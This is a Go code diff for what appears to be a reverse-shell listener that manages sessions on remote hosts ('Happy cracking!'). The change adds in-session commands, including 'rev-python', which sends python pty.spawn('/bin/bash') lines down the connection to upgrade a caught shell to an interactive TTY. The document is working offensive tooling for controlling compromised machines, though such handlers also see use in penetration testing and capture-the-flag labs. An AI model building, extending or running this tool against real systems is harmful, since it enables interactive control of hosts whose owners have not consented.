@@ -16,6 +16,7 @@ import (
 
 var ctrlCChan = make(chan os.Signal, 1)
 var backgroundCommand = "rev-bg"
+var sessionHelpCommand = "rev-help"
 
 func main() {
 	fmt.Println("=======================================")
@@ -133,6 +134,7 @@ func (s *Socket) interact() {
 
 	fmt.Printf("[+] Interact with Session ID: %d \n", s.sessionId)
 	fmt.Printf("[!] Type '%s' to background the current session\n", backgroundCommand)
+	fmt.Printf("[!] Type '%s' to show available commands\n", sessionHelpCommand)
 	fmt.Println("[+] Happy cracking!")
 	// Mark two signal for informational
 	stdoutThread := s.copyFromConnection(s.con, os.Stdout)
@@ -201,6 +203,7 @@ func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
 					result := prompt(fmt.Sprintf("\n[+] Do you really want to quit session [%d] ?", s.sessionId), inputChan)
 					if result {
 						s.isClosed = true
+						fmt.Println("[!] Press Enter to continue ..")
 						return
 					} else {
 						_, sendErr = dst.Write([]byte("\003\n"))
@@ -243,9 +246,7 @@ func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
 			nBytes, err = src.Read(buf)
 			// Special command
 			command := strings.TrimSuffix(string(buf[0 : nBytes]), "\n")
-			if command == backgroundCommand {
-				s.isBackground = true
-			}
+			commandExecuted := s.inSessionCommandHandler(command,src,dst)
 
 			if s.isBackground || s.isClosed {
 				break
@@ -259,7 +260,11 @@ func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
 			}
 
 			// Send input to the input channel
-			inputChan <- buf[0:nBytes]
+			if(!commandExecuted){
+				inputChan <- buf[0:nBytes]
+			}else{
+				fmt.Println("[!] Press Enter to continue ..")
+			}
 		}
 	}()
 	return syncChannel
@@ -267,6 +272,31 @@ func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
 
 func (s *Socket) status() string {
 	return fmt.Sprintf("Session ID: [%d], Connection <%s> Seesion killed [%t]", s.sessionId, s.con.RemoteAddr(), s.isClosed)
+}
+
+func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.Writer) bool{
+	pythonttyCommand := "rev-python"
+	
+	switch command {
+	case sessionHelpCommand:
+		fmt.Println("<-------------------------------------------------")
+		fmt.Println(backgroundCommand,"- Background the session")
+		fmt.Println(pythonttyCommand,"- Try to start tty shell in python (Linux)")
+		fmt.Println("------------------------------------------------->")
+		return true
+	case backgroundCommand:
+		s.isBackground = true
+		return true
+	case pythonttyCommand:
+		fmt.Println("[+] Try Python 3 command ...")
+		dst.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")';\\n"))
+		fmt.Println("[+] Try Python 2 command ...")
+		dst.Write([]byte("python -c 'import pty;pty.spawn(\"/bin/bash\")';\\n"))
+		return true
+	}
+
+	//Default
+	return false
 }
 
 func prompt(message string, inputChan chan []byte) bool {
